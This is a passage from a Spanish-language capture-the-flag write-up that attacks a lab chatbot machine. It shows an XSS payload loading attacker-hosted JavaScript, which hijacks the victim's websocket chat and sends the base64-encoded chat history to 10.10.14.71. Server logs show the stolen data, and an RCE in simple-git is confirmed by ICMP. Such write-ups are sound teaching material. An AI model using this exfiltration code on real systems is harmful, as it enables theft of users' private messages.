</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/contact_us
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/admin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET       10l       16w      179c http://10.129.230.190/static =&gt; http://10.129.230.190/static/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET       10l       16w      181c http://10.129.230.190/scripts =&gt; http://10.129.230.190/scripts/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/chat
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/Contact_Us
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET       10l       16w      181c http://10.129.230.190/Scripts =&gt; http://10.129.230.190/Scripts/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/Chat
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span><span style="color:#ff0;font-weight:bold">301</span>      GET       10l       16w      187c http://10.129.230.190/restricted =&gt; http://10.129.230.190/restricted/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span><span style="color:#ff0;font-weight:bold">200</span>      GET        1l        3w       46c http://10.129.230.190/Admin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>[&gt;-------------------] - 49s    35083/1323280 35m     found:13      errors:0</span></span></code></pre></div>
<h1 id="information-leakage-via-xss">Information Leakage via XSS</h1>
<p>Y al ver el directorio <code>Scripts</code> recordÃ© el chatbot que existÃ­a y el comando <code>help</code> que este tiene para recuperar el historial de comandos. QuizÃ¡ puedo aprovecharme del XSS para inyectar una comunicaciÃ³n entre el chatbot y el usuario vÃ­ctima para recuperar su historial y obtener informaciÃ³n privilegiada.</p>
<p>LocalicÃ© que el script <code>socket.io.js</code> en <code>http://10.129.230.190/socket.io/socket.io.js</code></p>
<p>Por lo cual podrÃ­a simplemente inyectar este script y realizar la comunicaciÃ³n. Pero antes, tengo que ver como se realiza la comunicaciÃ³n desde el cliente.</p>
<p>Encontramos el script <code>chat.js</code>
<code>http://10.129.230.190/restricted/chat.js</code></p>
<p>Y vemos este apartado</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#fff;font-weight:bold">let</span> value;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#fff;font-weight:bold">const</span> res = axios.get(<span style="color:#0ff;font-weight:bold">`/user/api/chat`</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span><span style="color:#fff;font-weight:bold">const</span> socket = io(<span style="color:#0ff;font-weight:bold">&#39;/&#39;</span>,{withCredentials: <span style="color:#fff;font-weight:bold">true</span>});
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#007f7f">//listening for the messages
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#007f7f"></span>socket.on(<span style="color:#0ff;font-weight:bold">&#39;message&#39;</span>, (my_message) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  <span style="color:#007f7f">//console.log(&#34;Received From Server: &#34; + my_message)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#007f7f"></span>  Show_messages_on_screen_of_Server(my_message)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>})</span></span></code></pre></div>
<p>Esto lo hago para hacerme una idea ya que no habÃ­a trabajado con websockets antes.</p>
<p>Ahora, tengo que refinar el XSS para poder cargar un archivo javascript malicioso, por ahora este va a ser el archivo.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ cat evil.js 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>fetch(<span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.71:8081/injected&#34;</span>)</span></span></code></pre></div>
<p>DespuÃ©s de hacer unas pruebas en local..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8081</span> (http://0.0.0.0:8081/) ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>127.0.0.1 - - [31/Jul/2024 18:46:37] <span style="color:#0ff;font-weight:bold">&#34;GET /test.html HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>127.0.0.1 - - [31/Jul/2024 18:46:37] <span style="color:#0ff;font-weight:bold">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>127.0.0.1 - - [31/Jul/2024 18:46:37] code 404, message File not found
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>127.0.0.1 - - [31/Jul/2024 18:46:37] <span style="color:#0ff;font-weight:bold">&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">404</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>10.10.14.71 - - [31/Jul/2024 18:46:37] <span style="color:#0ff;font-weight:bold">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -</span></span></code></pre></div>
<p>Este es mi payload final</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>â””â”€â”€â•¼ [â˜…]$ cat test.html 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>&lt;<span style="font-weight:bold">IMG</span> <span style="color:#007f7f">SRC</span>=<span style="color:#0ff;font-weight:bold">&#34;/&#34;</span> <span style="color:#007f7f">onerror</span>=<span style="color:#0ff;font-weight:bold">&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#0ff;font-weight:bold">  var script = document.createElement(&#39;script&#39;);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#0ff;font-weight:bold">  script.src = &#39;http://10.10.14.71:8081/evil.js&#39;;
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span><span style="color:#0ff;font-weight:bold">  document.head.appendChild(script);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#0ff;font-weight:bold">&#34;</span>&gt;</span></span></code></pre></div>
<p>Y perfecto, ahora solo falta hacer el cÃ³digo javascript malicioso.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Podemos interceptar una peticiÃ³n de mensaje con <code>burpsuite</code> para hacernos una mejor idea de como se tramita el mensaje por detrÃ¡s.
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>DespuÃ©s de probar un rato&hellip;</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8081</span> (http://0.0.0.0:8081/) ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] <span style="color:#0ff;font-weight:bold">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /injected HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /loadedd HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>10.129.230.190 - - [31/Jul/2024 19:18:34] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?q=Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20type%20help%20to%20see%20some%20buildin%20commands HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -</span></span></code></pre></div>
<p>Este es el archivo <code>evil.js</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ cat evil.js 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>fetch(<span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.71:8081/injected&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#007f7f">// Incluimos el socket.io.js ya que en principio no estÃ¡ incluido.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">const</span> script = <span style="color:#fff;font-weight:bold">document</span>.createElement(<span style="color:#0ff;font-weight:bold">&#34;script&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>script.src = <span style="color:#0ff;font-weight:bold">&#34;http://10.129.230.190/socket.io/socket.io.js&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">document</span>.head.appendChild(script)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#007f7f">// Esperamos a que carge el script......
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span><span style="color:#007f7f"></span>script.addEventListener(<span style="color:#0ff;font-weight:bold">&#39;load&#39;</span>, <span style="color:#fff;font-weight:bold">function</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>	fetch(<span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.71:8081/loadedd&#34;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>	<span style="color:#fff;font-weight:bold">const</span> res = fetch(<span style="color:#0ff;font-weight:bold">&#39;/user/api/chat&#39;</span>); <span style="color:#007f7f">// No se si estÃ¡ la libreria de axios inyectada ya
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#007f7f"></span>	<span style="color:#fff;font-weight:bold">const</span> socket = io(<span style="color:#0ff;font-weight:bold">&#39;/&#39;</span>,{withCredentials: <span style="color:#fff;font-weight:bold">true</span>});
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>	socket.on(<span style="color:#0ff;font-weight:bold">&#39;message&#39;</span>, (msg) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>		fetch(<span style="color:#0ff;font-weight:bold">&#34;http://10.10.14.71:8081/?q=&#34;</span> + msg)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>	});
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>	socket.emit(<span style="color:#0ff;font-weight:bold">&#39;client_message&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;help&#39;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>});</span></span></code></pre></div>
<p>Vamos a hacer un par de retoques finales, primero vamos a codificar en base64 la respuesta para poder verla mas cÃ³moda.</p>
<p>Modificamos la linea <code>fetch(&quot;http://10.10.14.71:8081/?q=&quot; + msg)</code> por <code>fetch(&quot;http://10.10.14.71:8081/?q=&quot; + btoa(msg))</code></p>
<p>Y la linea <code>socket.emit('client_message', 'help')</code> por <code>socket.emit('client_message', 'history')</code> ya que lo que queremos es ver el historial del usuario.</p>
<p>Y recibimos la siguiente data</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ python3 -m http.server <span style="color:#ff0;font-weight:bold">8081</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Serving HTTP on 0.0.0.0 port <span style="color:#ff0;font-weight:bold">8081</span> (http://0.0.0.0:8081/) ...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;GET /evil.js HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">200</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /injected HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /loadedd HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method (<span style="color:#0ff;font-weight:bold">&#39;OPTIONS&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>10.129.230.190 - - [31/Jul/2024 19:22:40] <span style="color:#0ff;font-weight:bold">&#34;OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1&#34;</span> <span style="color:#ff0;font-weight:bold">501</span> -</span></span></code></pre></div>
<p>Decodificando las cadenas podemos ver que hemos descubierto un subdominio.
<code>dev-git-auto-update.chatbot.htb</code>
<img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<h1 id="foothold">Foothold</h1>
<p>Descubrimos otro servicio extra.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Con un vistazo rÃ¡pido a la pÃ¡gina detectamos que se estÃ¡ usando <code>simple-git v3.14</code>
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>Y una simple bÃºsqueda en Google nos reporta que tiene una vulnerabilidad de tipo RCE. Lo podemos leer <a href="https://github.com/gitpython-developers/GitPython/issues/1515">aquÃ­</a></p>
<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Â¡Y tenemos RCE!</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo tcpdump icmp -i tun0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>tcpdump: verbose output suppressed, use -v[v]... <span style="color:#fff;font-weight:bold">for</span> full protocol decode
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>listening on tun0, link-type RAW (Raw IP), snapshot length <span style="color:#ff0;font-weight:bold">262144</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>19:30:29.164331 IP dev-git-auto-update.chatbot.htb &gt; 10.10.14.71: ICMP <span style="color:#fff;font-weight:bold">echo</span> request, id 1, seq 1, length <span style="color:#ff0;font-weight:bold">64</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>19:30:29.164390 IP 10.10.14.71 &gt; dev-git-auto-update.chatbot.htb: ICMP <span style="color:#fff;font-weight:bold">echo</span> reply, id 1, seq 1, length <span style="color:#ff0;font-weight:bold">64</span>
